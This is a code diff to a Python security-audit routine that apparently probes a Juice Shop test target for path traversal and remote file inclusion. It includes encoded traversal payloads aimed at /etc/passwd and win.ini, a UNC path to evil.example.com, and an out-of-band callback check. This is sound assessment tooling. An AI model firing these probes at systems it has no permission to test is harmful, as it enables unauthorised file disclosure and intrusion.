@@ -12384,6 +12384,7 @@ def evaluate_azi05_lfi_rfi(
     report_out_path: Path | None = None,
     har_out_path: Path | None = None,
     run_zap: bool = True,
+    run_rfi: bool = True,
 ) -> dict:
     """Evaluate AZI-05 (ASVS V5.3.9, V12.3.2-3 / CWE-22, CWE-98) via OWASP ZAP 6/7 + LFI/RFI matrix."""
     base_url = target_url.strip().rstrip("/")
@@ -12464,7 +12465,10 @@ def evaluate_azi05_lfi_rfi(
 
     # 2. Encoded, double-encoded, null-byte, absolute, and UNC traversal probes (CWE-22)
     azi05_probes = 0
-    lfi_marker_re = re.compile(r'root:[x*]:0:0:|"name"\s*:\s*"juice-shop"|suspicious error messages|\[boot loader\]', re.IGNORECASE)
+    lfi_marker_re = re.compile(
+        r'root:[x*]:0:0:|"name"\s*:\s*"juice-shop"|suspicious error messages|\[boot loader\]|\[extensions\]|for 16-bit app support|127\.0\.0\.1\s+localhost',
+        re.IGNORECASE,
+    )
 
     if param_targets is not None:
         traversal_vectors = [
@@ -12476,6 +12480,7 @@ def evaluate_azi05_lfi_rfi(
                 (f"{path_lbl}_null_byte", "..%2fetc%2fpasswd%2500.md"),
                 (f"{path_lbl}_absolute_path", "%2fetc%2fpasswd"),
                 (f"{path_lbl}_unc_path", "%5c%5cevil.example.com%5cshare%5cfile.md"),
+                (f"{path_lbl}_win_backslash", "..%5c..%5c..%5cwindows%5cwin.ini"),
             ]
         ]
     else:
@@ -12533,52 +12538,57 @@ def evaluate_azi05_lfi_rfi(
         def log_message(self, *args):
             pass
 
-    rfi_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _RfiCallbackHandler)
-    rfi_port = rfi_srv.server_address[1]
-    threading.Thread(target=rfi_srv.serve_forever, daemon=True).start()
     unique_rfi_hits: list[str] = []
-    try:
-        rfi_target_url = f"http://127.0.0.1:{rfi_port}/casa3_rfi_probe.svg"
-        if session_token:
-            rfi_st, _, rfi_body = _probe_logged(
-                "/profile/image/url",
-                method="POST",
-                headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": f"token={session_token}"},
-                body=f"imageUrl={urllib.parse.quote(rfi_target_url, safe='')}".encode("utf-8"),
-            )
-            azi05_probes += 1
-            time.sleep(0.25)
-            with rfi_lock:
-                unique_rfi_hits = sorted(set(rfi_cb_hits))
-            if unique_rfi_hits or "CASA3_RFI" in rfi_body:
-                _add_lfi_finding(
-                    f"{base_url}/profile/image/url",
-                    "remote_file_inclusion_fetch",
-                    "CWE-98",
-                    rfi_st,
-                    f"POST {base_url}/profile/image/url (imageUrl={rfi_target_url}) caused the server to fetch arbitrary remote resource(s) {unique_rfi_hits} (HTTP {rfi_st}, RFI/SSRF — CWE-98).",
-                    confirmed_by="rfi_oob_fetch",
+    if run_rfi:
+        rfi_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _RfiCallbackHandler)
+        rfi_port = rfi_srv.server_address[1]
+        threading.Thread(target=rfi_srv.serve_forever, daemon=True).start()
+        try:
+            rfi_target_url = f"http://127.0.0.1:{rfi_port}/casa3_rfi_probe.svg"
+            if session_token:
+                rfi_st, _, rfi_body = _probe_logged(
+                    "/profile/image/url",
+                    method="POST",
+                    headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": f"token={session_token}"},
+                    body=f"imageUrl={urllib.parse.quote(rfi_target_url, safe='')}".encode("utf-8"),
                 )
+                azi05_probes += 1
+                time.sleep(0.25)
+                with rfi_lock:
+                    unique_rfi_hits = sorted(set(rfi_cb_hits))
+                if unique_rfi_hits or "CASA3_RFI" in rfi_body:
+                    _add_lfi_finding(
+                        f"{base_url}/profile/image/url",
+                        "remote_file_inclusion_fetch",
+                        "CWE-98",
+                        rfi_st,
+                        f"POST {base_url}/profile/image/url (imageUrl={rfi_target_url}) caused the server to fetch arbitrary remote resource(s) {unique_rfi_hits} (HTTP {rfi_st}, RFI/SSRF — CWE-98).",
+                        confirmed_by="rfi_oob_fetch",
+                    )
 
-        for rfi_tpl in rfi_targets or []:
-            rfi_url_path = rfi_tpl.format(p=urllib.parse.quote(rfi_target_url, safe=""))
-            rq_st, _, rq_body = _probe_logged(rfi_url_path, headers=auth_hdrs)
-            azi05_probes += 1
-            time.sleep(0.15)
-            with rfi_lock:
-                unique_rfi_hits = sorted(set(rfi_cb_hits))
-            if (unique_rfi_hits or "CASA3_RFI" in rq_body) and 200 <= rq_st < 300:
-                _add_lfi_finding(
-                    f"{base_url}{rfi_url_path.split('?', 1)[0]}",
-                    "remote_file_inclusion_marker",
-                    "CWE-98",
-                    rq_st,
-                    f"GET {base_url}{rfi_url_path.split('?', 1)[0]} fetched remote resource {unique_rfi_hits} and/or returned inclusion marker CASA3_RFI (HTTP {rq_st}, CWE-98).",
-                    confirmed_by="rfi_inclusion_marker" if "CASA3_RFI" in rq_body else "rfi_oob_fetch",
-                )
-    finally:
-        rfi_srv.shutdown()
-        rfi_srv.server_close()
+            for rfi_idx, rfi_tpl in enumerate(rfi_targets or []):
+                per_target_url = f"http://127.0.0.1:{rfi_port}/casa3_rfi_probe_{rfi_idx}.svg"
+                with rfi_lock:
+                    hits_before = len(rfi_cb_hits)
+                rfi_url_path = rfi_tpl.format(p=urllib.parse.quote(per_target_url, safe=""))
+                rq_st, _, rq_body = _probe_logged(rfi_url_path, headers=auth_hdrs)
+                azi05_probes += 1
+                time.sleep(0.15)
+                with rfi_lock:
+                    new_hits = sorted(set(rfi_cb_hits[hits_before:]))
+                    unique_rfi_hits = sorted(set(rfi_cb_hits))
+                if (new_hits or "CASA3_RFI" in rq_body) and 200 <= rq_st < 300:
+                    _add_lfi_finding(
+                        f"{base_url}{rfi_url_path.split('?', 1)[0]}",
+                        "remote_file_inclusion_marker",
+                        "CWE-98",
+                        rq_st,
+                        f"GET {base_url}{rfi_url_path.split('?', 1)[0]} fetched remote resource {new_hits} and/or returned inclusion marker CASA3_RFI (HTTP {rq_st}, CWE-98).",
+                        confirmed_by="rfi_inclusion_marker" if "CASA3_RFI" in rq_body else "rfi_oob_fetch",
+                    )
+        finally:
+            rfi_srv.shutdown()
+            rfi_srv.server_close()
 
     rep_file = report_out_path or (OUTPUT_DIR / "azi05-lfi-rfi-audit.json")
     rep_file.parent.mkdir(parents=True, exist_ok=True)
